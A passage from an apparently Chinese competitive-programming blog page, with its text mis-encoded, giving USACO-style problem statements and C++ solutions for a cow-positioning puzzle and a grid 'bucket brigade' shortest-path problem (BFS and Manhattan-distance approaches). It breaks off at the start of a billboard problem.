æ­¤æ—¶åªè¦æŠŠaç§»åŠ¨åˆ°bã€cä¸­é—´å³å¯ï¼Œè¾“å‡º $1$</p><p>æƒ…å†µ4: a,b,c ä»»æ„ä¸¤å¤´ç‰›é—´éš”éƒ½ä¸ä¸º $1$ï¼Œå³<code>---a------b----c---</code>,</p><p>(1)æ­¤æ—¶åªè¦æŠŠcç§»åŠ¨åˆ°bå‰é¢ $2$ ä½ï¼Œå¾—åˆ°<code>---a-----c-b-----</code>ï¼Œ</p><p>(2)ç„¶åå†æŠŠaç§»åˆ°c,bä¸­é—´,å¾—åˆ°<code>--------cab-----</code></p><p>ä¸€å…±ä¸¤æ¬¡æ“ä½œï¼Œè¾“å‡º $2$</p><p><strong>æœ€å¤šæ¬¡æ•°:</strong></p><p>ä¸¾ä¾‹ï¼Œå¯¹äºâ€”aâ€”â€”bâ€”-câ€”è¿™ç§æƒ…å†µ</p><p>æˆ‘ä»¬å¯ä»¥è´ªå¿ƒåœ°æŠŠcç§»åˆ°bå‰é¢ï¼Œå†æŠŠbç§»åˆ°cå‰é¢ï¼Œæ¥ç€æŠŠcç§»åˆ°bå‰é¢ï¼Œè¿™æ ·å¾€å¤æ“ä½œ</p><blockquote><p>1.â€”aâ€”â€“cbâ€”â€”â€“<br>2.â€”aâ€”-bcâ€”â€”â€”<br>3.â€”aâ€”cbâ€”â€”â€”-<br>4.â€”aâ€“bcâ€”â€”â€”â€“<br>5.â€”a-cbâ€”â€”â€”â€”<br>6.â€”abcâ€”â€”â€”â€”-</p></blockquote><p>æ‰€ä»¥æˆ‘ä»¬åªéœ€æ‰¾å‡ºb-aå’Œc-bçš„ä¸¤ä¸ªé—´éš”è°æ›´å¤§å†å‡1å³å¯</p><p>ä»£ç å®ä¾‹ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">;</span>  cin <span class="token operator">&gt;&gt;</span> a <span class="token operator">&gt;&gt;</span> b <span class="token operator">&gt;&gt;</span> c<span class="token punctuation">;</span>    <span class="token comment">// å…ˆè¾“å‡ºæœ€å°‘æ¬¡æ•°</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b<span class="token operator">==</span>a<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>c<span class="token operator">==</span>b<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> cout<span class="token operator">&lt;&lt;</span><span class="token number">0</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>  <span class="token comment">// ä¸Šè¿°æƒ…å†µ1</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>b <span class="token operator">==</span> a <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">||</span> c <span class="token operator">==</span> b <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span>  cout<span class="token operator">&lt;&lt;</span><span class="token number">1</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>  <span class="token comment">// ä¸Šè¿°æƒ…å†µ2å’Œ3</span>    <span class="token keyword">else</span> cout<span class="token operator">&lt;&lt;</span><span class="token number">2</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span> <span class="token comment">// ä¸Šè¿°æƒ…å†µ4</span>    <span class="token comment">// ç„¶åè¾“å‡ºæœ€å¤šæ¬¡æ•°</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token function">max</span><span class="token punctuation">(</span>b <span class="token operator">-</span> a<span class="token punctuation">,</span> c <span class="token operator">-</span> b<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="æ°´æ¡¶ä¼ é€’é˜Ÿåˆ—"><a href="#æ°´æ¡¶ä¼ é€’é˜Ÿåˆ—" class="headerlink" title="æ°´æ¡¶ä¼ é€’é˜Ÿåˆ—"></a>æ°´æ¡¶ä¼ é€’é˜Ÿåˆ—</h2><p>å†œåœºä¸Šèµ·ç«äº†ï¼Œå¥¶ç‰›ä»¬æ­£åœ¨ç´§æ€¥èµ¶å»ç­ç«ï¼</p><p>å†œåœºå¯ä»¥ç”¨ä¸€ä¸ªåƒè¿™æ ·çš„ $10 \times 10$ çš„å­—ç¬¦æ–¹é˜µæ¥æè¿°ï¼š</p><pre class="line-numbers language-none"><code class="language-none">................................B......................R.............................L..............<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å­—ç¬¦â€™Bâ€™è¡¨ç¤ºæ­£ç€ç«çš„ç‰›æ£šï¼Œå­—ç¬¦â€™Lâ€™è¡¨ç¤ºä¸€ä¸ªæ¹–ï¼Œè€Œå­—ç¬¦â€™Râ€™è¡¨ç¤ºå†œåœºä¸Šçš„ä¸€å—å·¨å¤§å²©çŸ³ã€‚</p><p>å¥¶ç‰›ä»¬æƒ³è¦æ²¿ç€ä¸€æ¡æ¹–åˆ°ç‰›æ£šä¹‹é—´çš„è·¯å¾„ç»„æˆä¸€æ¡â€œæ°´æ¡¶ä¼ é€’é˜Ÿåˆ—â€ï¼Œè¿™æ ·å¥¹ä»¬å°±å¯ä»¥æ²¿ç€è¿™æ¡è·¯å¾„ä¼ é€’æ°´æ¡¶æ¥å¸®åŠ©ç­ç«ã€‚</p><p>å½“ä¸¤å¤´å¥¶ç‰›åœ¨ä¸œå—è¥¿åŒ—å››ä¸ªæ–¹å‘ä¸Šç›¸é‚»æ—¶æ°´æ¡¶å¯ä»¥åœ¨å¥¹ä»¬ä¹‹é—´ä¼ é€’ã€‚</p><p>æ¹–è¾¹çš„å¥¶ç‰›ä¹Ÿæ˜¯å¦‚æ­¤â€”â€”å¥¶ç‰›åªèƒ½åœ¨ç´§æŒ¨ç€æ¹–çš„æ—¶å€™æ‰èƒ½ç”¨æ°´æ¡¶ä»æ¹–é‡Œå–æ°´ã€‚</p><p>ç±»ä¼¼åœ°ï¼Œå¥¶ç‰›åªèƒ½åœ¨ç´§æŒ¨ç€ç‰›æ£šçš„æ—¶å€™æ‰èƒ½ç”¨æ°´å»ç­ç‰›æ£šçš„ç«ã€‚</p><p>è¯·å¸®åŠ©æ±‚å‡ºå¥¶ç‰›ä»¬ä¸ºäº†ç»„æˆè¿™æ ·çš„â€œæ°´æ¡¶ä¼ é€’é˜Ÿåˆ—â€éœ€è¦å æ®çš„â€™.â€™æ ¼å­çš„æœ€å°æ•°é‡ã€‚</p><p>å¥¶ç‰›ä¸èƒ½ç«™åœ¨å²©çŸ³æ‰€åœ¨çš„æ–¹æ ¼ä¹‹å†…ï¼Œæ­¤å¤–ä¿è¯ç‰›æ£šå’Œæ¹–ä¸æ˜¯ç›¸é‚»çš„ã€‚</p><h4 id="è¾“å…¥æ ¼å¼-1"><a href="#è¾“å…¥æ ¼å¼-1" class="headerlink" title="è¾“å…¥æ ¼å¼"></a>è¾“å…¥æ ¼å¼</h4><p>è¾“å…¥åŒ…å« $10$ è¡Œï¼Œæ¯è¡Œ $10$ ä¸ªå­—ç¬¦ï¼Œæè¿°è¿™ä¸ªå†œåœºçš„å¸ƒå±€ã€‚</p><p>è¾“å…¥ä¿è¯å›¾æ¡ˆä¸­æ°æœ‰ä¸€ä¸ªå­—ç¬¦â€™Bâ€™ã€ä¸€ä¸ªå­—ç¬¦â€™Lâ€™ä»¥åŠä¸€ä¸ªå­—ç¬¦â€™Râ€™ã€‚</p><h4 id="è¾“å‡ºæ ¼å¼-1"><a href="#è¾“å‡ºæ ¼å¼-1" class="headerlink" title="è¾“å‡ºæ ¼å¼"></a>è¾“å‡ºæ ¼å¼</h4><p>è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œä¸ºç»„æˆä¸€æ¡å¯è¡Œçš„æ°´æ¡¶ä¼ é€’é˜Ÿåˆ—æ‰€éœ€è¦çš„å¥¶ç‰›çš„æœ€å°æ•°é‡ã€‚</p><h4 id="è¾“å…¥æ ·ä¾‹ï¼š-1"><a href="#è¾“å…¥æ ·ä¾‹ï¼š-1" class="headerlink" title="è¾“å…¥æ ·ä¾‹ï¼š"></a>è¾“å…¥æ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">................................B......................R.............................L..............<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="è¾“å‡ºæ ·ä¾‹ï¼š-1"><a href="#è¾“å‡ºæ ·ä¾‹ï¼š-1" class="headerlink" title="è¾“å‡ºæ ·ä¾‹ï¼š"></a>è¾“å‡ºæ ·ä¾‹ï¼š</h4><pre class="line-numbers language-none"><code class="language-none">7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="æ ·ä¾‹è§£é‡Š-1"><a href="#æ ·ä¾‹è§£é‡Š-1" class="headerlink" title="æ ·ä¾‹è§£é‡Š"></a>æ ·ä¾‹è§£é‡Š</h4><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œä»¥ä¸‹æ˜¯ä¸€ä¸ªå¯è¡Œçš„æ–¹æ¡ˆï¼Œä½¿ç”¨äº†æœ€å°æ•°é‡çš„å¥¶ç‰›ï¼ˆ7ï¼‰ï¼š</p><pre class="line-numbers language-none"><code class="language-none">................................B.........C.........CC.R.......CCC.........C.........L..............<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="é¢˜è§£-1"><a href="#é¢˜è§£-1" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h4><p><strong>è§£æ³•ä¸€ï¼š</strong></p><p>åœ°å›¾ä¸­æ±‚æœ€çŸ­è·ç¦»ï¼Œæ ‡å‡†çš„å¹¿åº¦ä¼˜å…ˆéå†ã€‚</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;queue&gt;</span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> N <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">char</span> map<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>bool st<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> dist<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span>queue<span class="token operator">&lt;</span>pair<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token operator">&gt;</span> q<span class="token punctuation">;</span><span class="token keyword">int</span> lx<span class="token punctuation">,</span>ly<span class="token punctuation">;</span><span class="token keyword">int</span> dx<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> dy<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>cin<span class="token operator">&gt;&gt;</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token char">'L'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>lx <span class="token operator">=</span> i<span class="token punctuation">;</span>ly <span class="token operator">=</span> j<span class="token punctuation">;</span><span class="token punctuation">}</span>  <span class="token punctuation">}</span> <span class="token punctuation">}</span>q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span>lx<span class="token punctuation">,</span>ly<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>dist<span class="token punctuation">[</span>lx<span class="token punctuation">]</span><span class="token punctuation">[</span>ly<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>st<span class="token punctuation">[</span>lx<span class="token punctuation">]</span><span class="token punctuation">[</span>ly<span class="token punctuation">]</span> <span class="token operator">=</span> true<span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">auto</span> temp <span class="token operator">=</span> q<span class="token punctuation">.</span><span class="token function">front</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> a <span class="token operator">=</span> temp<span class="token punctuation">.</span>first<span class="token punctuation">;</span><span class="token keyword">int</span> b <span class="token operator">=</span> temp<span class="token punctuation">.</span>second<span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> x <span class="token operator">=</span> a <span class="token operator">+</span> dx<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> y <span class="token operator">=</span> b <span class="token operator">+</span> dy<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>x <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> y <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> x <span class="token operator">&lt;</span> <span class="token number">10</span> <span class="token operator">&amp;&amp;</span> y <span class="token operator">&lt;</span> <span class="token number">10</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>st<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> map<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token char">'R'</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span>map<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'B'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>cout<span class="token operator">&lt;&lt;</span>dist<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>st<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> true<span class="token punctuation">;</span>dist<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> dist<span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token punctuation">[</span>b<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{</span>x<span class="token punctuation">,</span>y<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>è§£æ³•äºŒï¼š</strong></p><p>è¾“å…¥ä¿è¯å›¾æ¡ˆä¸­æ°æœ‰ä¸€ä¸ªå­—ç¬¦â€™ $B$ â€™ã€ä¸€ä¸ªå­—ç¬¦â€™Lâ€™ä»¥åŠä¸€ä¸ªå­—ç¬¦â€™ $R$ â€™ã€‚</p><p>å…³é”®æ˜¯åªæœ‰ä¸€ä¸ª $R$ ï¼Œå³åªæœ‰ä¸€ä¸ªéšœç¢ç‰©ï¼Œæ‰€ä»¥å¯ä»¥ä¸ç”¨BFSï¼Œç›´æ¥åˆ†ç±»è®¨è®ºå®Œäº‹ã€‚</p><p>ä¸¤ç‚¹ä¹‹é—´çš„æœ€çŸ­è·¯æ˜¯æ›¼å“ˆé¡¿è·ç¦»ï¼Œå½“èµ·ç‚¹ä¸ç»ˆç‚¹çš„è¡Œä¸åˆ—å‡ä¸åŒæ—¶ï¼Œä¸€å®šèƒ½èµ°æ›¼å“ˆé¡¿è·ç¦»</p><p>æ¯”å¦‚ï¼š</p><pre class="line-numbers language-none"><code class="language-none">......B....R......L......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>èƒ½èµ°çš„è·¯ä¸ºï¼š</p><pre class="line-numbers language-none"><code class="language-none">......BCC..R.C....L......<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ­¤æ—¶ï¼Œæ— è®ºRåœ¨å“ªé‡Œï¼Œéƒ½ä¸ä¼šå½±å“è¡Œèµ°æ–¹æ³•ï¼Œæ‰€ä»¥å°±æ˜¯ä¸¤ç‚¹çš„æ›¼å“ˆé¡¿è·ç¦»ã€‚</p><p>éœ€è¦çš„å¥¶ç‰›æ•°é‡å°±æ˜¯æ›¼å“ˆé¡¿è·ç¦» $âˆ’1$</p><p>é‚£ä»€ä¹ˆæ—¶å€™ä¸æ˜¯æ›¼å“ˆé¡¿è·ç¦»å‘¢ï¼Ÿæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ä¸‹é¢è¿™ç§æƒ…å†µï¼š</p><pre class="line-numbers language-none"><code class="language-none">........L.R.B........<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å½“Lã€Bã€Råœ¨åŒä¸€è¡Œï¼Œå¹¶ä¸”Råœ¨Lå’ŒBä¸­é—´æ—¶ï¼Œç”±äºè·¯ä¸Šè¢«RæŒ¡ä½ï¼Œæ‰€ä»¥æ— æ³•ç›´æ¥èµ°æ›¼å“ˆé¡¿è·ç¦»ï¼Œåªèƒ½ç»•è·¯èµ°ã€‚</p><pre class="line-numbers language-none"><code class="language-none">..CCC...LCRCB........<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>åŒç†ï¼Œå½“Lã€Bã€Råœ¨åŒä¸€åˆ—ï¼Œå¹¶ä¸”Råœ¨Lå’ŒBä¸­é—´æ—¶ï¼Œä¹Ÿä¸å¾—ä¸ç»•è·¯èµ°ã€‚</p><p>æ­¤æ—¶ï¼Œéœ€è¦çš„å¥¶ç‰›æ•°é‡ä¸ºæ›¼å“ˆé¡¿è·ç¦» $+1$</p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬å¾—å‡ºå¦‚ä¸‹ç»“è®ºï¼š</p><p>å½“Lã€Bã€Råœ¨åŒä¸€è¡Œæˆ–è€…åŒä¸€åˆ—ï¼Œå¹¶ä¸”Råœ¨Lå’ŒBä¸­é—´æ—¶ï¼Œéœ€è¦çš„å¥¶ç‰›æ•°é‡ä¸ºä¸¤ç‚¹çš„æ›¼å“ˆé¡¿è·ç¦» $+1$ï¼Œå…¶ä½™å‡ä¸ºæ›¼å“ˆé¡¿è·ç¦» $âˆ’1$</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span>using namespace std<span class="token punctuation">;</span><span class="token keyword">char</span> g<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> x1<span class="token punctuation">,</span> y1<span class="token punctuation">,</span> x2<span class="token punctuation">,</span> y2<span class="token punctuation">,</span> x3<span class="token punctuation">,</span> y3<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> g<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>g<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token char">'L'</span><span class="token punctuation">)</span>                x1<span class="token operator">=</span>i<span class="token punctuation">,</span> y1<span class="token operator">=</span>j<span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>g<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token char">'R'</span><span class="token punctuation">)</span>                x2<span class="token operator">=</span>i<span class="token punctuation">,</span> y2<span class="token operator">=</span>j<span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>g<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token char">'B'</span><span class="token punctuation">)</span>                x3<span class="token operator">=</span>i<span class="token punctuation">,</span> y3<span class="token operator">=</span>j<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">int</span> ans<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>x1<span class="token operator">==</span>x2<span class="token operator">&amp;&amp;</span>x2<span class="token operator">==</span>x3<span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>y1<span class="token operator">&lt;</span>y2<span class="token operator">&amp;&amp;</span>y2<span class="token operator">&lt;</span>y3<span class="token operator">||</span>y1<span class="token operator">&gt;</span>y2<span class="token operator">&amp;&amp;</span>y2<span class="token operator">&gt;</span>y3<span class="token punctuation">)</span><span class="token punctuation">)</span>        ans<span class="token operator">=</span><span class="token function">abs</span><span class="token punctuation">(</span>x1<span class="token operator">-</span>x3<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">abs</span><span class="token punctuation">(</span>y1<span class="token operator">-</span>y3<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>y1<span class="token operator">==</span>y2<span class="token operator">&amp;&amp;</span>y2<span class="token operator">==</span>y3<span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span>x1<span class="token operator">&lt;</span>x2<span class="token operator">&amp;&amp;</span>x2<span class="token operator">&lt;</span>x3<span class="token operator">||</span>x1<span class="token operator">&gt;</span>x2<span class="token operator">&amp;&amp;</span>x2<span class="token operator">&gt;</span>x3<span class="token punctuation">)</span><span class="token punctuation">)</span>        ans<span class="token operator">=</span><span class="token function">abs</span><span class="token punctuation">(</span>x1<span class="token operator">-</span>x3<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">abs</span><span class="token punctuation">(</span>y1<span class="token operator">-</span>y3<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        ans<span class="token operator">=</span><span class="token function">abs</span><span class="token punctuation">(</span>x1<span class="token operator">-</span>x3<span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">abs</span><span class="token punctuation">(</span>y1<span class="token operator">-</span>y3<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> ans<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="é˜»æŒ¡å¹¿å‘Šç‰Œ"><a href="#é˜»æŒ¡å¹¿å‘Šç‰Œ" class="headerlink" title="é˜»æŒ¡å¹¿å‘Šç‰Œ"></a>é˜»æŒ¡å¹¿å‘Šç‰Œ</h2><p>åœ¨æ¼«é•¿çš„äº§å¥¶æœŸé—´ï¼Œå¥¶ç‰›è´èŒœå–œæ¬¢é€è¿‡çª—æˆ·ç›¯ç€é©¬è·¯å¯¹é¢çš„ä¸¤ä¸ªå·¨å¤§çš„çŸ©å½¢å¹¿å‘Šç‰Œï¼Œä¸Šé¢å†™ç€â€œå†œå¤«äºšå†å…‹æ–¯çš„æƒŠäººå¼€èƒƒè‹œè“¿â€å’Œâ€œå†œå¤«æ ¼é›·æ 